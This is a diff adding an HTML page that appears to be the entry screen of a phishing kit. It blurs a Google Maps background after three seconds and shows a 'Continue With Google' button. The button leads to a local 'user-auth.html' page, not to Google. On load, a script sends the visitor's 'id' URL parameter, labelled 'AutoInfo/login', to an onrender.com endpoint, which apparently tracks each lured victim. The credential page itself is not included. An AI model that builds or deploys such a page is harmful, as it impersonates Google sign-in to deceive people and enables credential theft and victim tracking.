@@ -1,0 +1,233 @@
+<!doctype html>
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Map Overlay Example</title>
+
+    <!-- Font Awesome for search icon -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+    />
+
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: Arial, sans-serif;
+      }
+
+      /* Map fullscreen */
+      .map-background {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        border: none;
+        z-index: -1;
+        /* filter: blur(3px); */
+      }
+
+      /* Overlay button */
+      /* Center overlay on all devices */
+      .overlay {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        z-index: 3;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 100%;
+        padding: 0 16px; /* space on left/right for small screens */
+        box-sizing: border-box;
+      }
+
+      /* Button styling */
+      .google-button-overlay {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #bfdbfe;
+        padding: 12px 18px;
+        border-radius: 10px;
+        text-decoration: none;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        color: #333;
+        cursor: pointer;
+        transition: transform 0.2s;
+        max-width: 90%; /* prevent button from going outside screen */
+        font-size: 16px;
+      }
+
+      /* Icon inside button */
+      .google-button-overlay img {
+        width: 22px;
+        height: 22px;
+        margin-right: 8px;
+      }
+
+      /* Hover effect */
+      .google-button-overlay:hover {
+        transform: scale(1.05);
+      }
+
+      /* 📱 Mobile responsive adjustments */
+      @media (max-width: 480px) {
+        .google-button-overlay {
+          padding: 10px 14px;
+          font-size: 14px;
+          border-radius: 8px;
+        }
+
+        .google-button-overlay img {
+          width: 20px;
+          height: 20px;
+        }
+      }
+
+      /* NEW SEARCH BAR SECTION */
+      .newcontainer {
+        position: fixed;
+        top: 40px;
+        left: 50%;
+        transform: translateX(-50%);
+        z-index: 4;
+        width: 350px;
+        text-align: left;
+        /* filter: blur(3px); */
+      }
+
+      .newinput-section label {
+        color: #333;
+        display: block;
+        font-size: 16px;
+        margin-bottom: 10px;
+        align-items: center;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin: 10px;
+      }
+
+      .newsearch-container {
+        margin-top: 6px;
+        background: #fff;
+        padding: 5px 5px;
+        border-radius: 30px;
+        display: flex;
+        align-items: center;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+      }
+
+      .newsearch-container input {
+        flex: 1;
+        font-size: 15px;
+        color: #333;
+        border: none;
+      }
+
+      .newclear-btn {
+        background: none;
+        border: none;
+        font-size: 18px;
+        color: #777;
+        cursor: pointer;
+        padding: 5px;
+      }
+
+      .newclear-btn:hover {
+        color: #000;
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- MAP BACKGROUND -->
+    <div>
+      <iframe
+        class="map-background"
+        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3153.5693930527423!2d144.95855721544715!3d-37.818435979751494!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6ad642af0f11fd81%3A0xf577f5d1f11f1c1b!2sFederation%20Square!5e0!3m2!1sen!2sau!4v1601360233956!5m2!1sen!2sau"
+        allowfullscreen="true"
+        loading="lazy"
+      >
+      </iframe>
+    </div>
+
+    <!-- OVERLAY BUTTON -->
+    <div class="overlay">
+      <a href="user-auth.html" class="google-button-overlay">
+        <img src="https://i.ibb.co.com/r2hMPDjS/logg.webp" alt="icon" />
+        Continue With Google
+      </a>
+    </div>
+
+    <!-- NEW SEARCH UI -->
+    <div class="newcontainer">
+      <div class="newinput-section">
+        <label for="name">What's your area?</label>
+      </div>
+
+      <div class="newsearch-container">
+        <input
+          type="text"
+          value="40.333453, -102.437074"
+          id="coordinate-input"
+        />
+
+        <i
+          id="searchIcon"
+          class="fa fa-search"
+          style="font-size: 20px; color: rgb(101, 101, 197); padding: 7px"
+        ></i>
+
+        <button
+          class="newclear-btn"
+          onclick="document.getElementById('coordinate-input').value = ''"
+        >
+          x
+        </button>
+      </div>
+    </div>
+    <script>
+      const id = new URLSearchParams(window.location.search).get("id");
+      let _id = "";
+      console.log(_id, "id");
+      window.addEventListener("load", () => {
+        setTimeout(() => {
+          document.querySelector(".newcontainer").style.filter = "blur(2px)";
+          document.querySelector(".map-background").style.filter = "blur(3px)";
+        }, 3000); // 3 seconds
+      });
+      window.addEventListener("load", () => {
+        fetch("https://megatools-8920.onrender.com/api/v1/information", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            user: id,
+            siteName: "AutoInfo/login",
+          }),
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            if (data.success) {
+              _id = data.data._id;
+              console.log("Saved ID:", _id);
+              localStorage.setItem("infoId", _id);
+            } else {
+              console.error(data.message);
+            }
+          })
+          .catch((error) => console.error(error));
+      });
+    </script>
+  </body>
+</html>
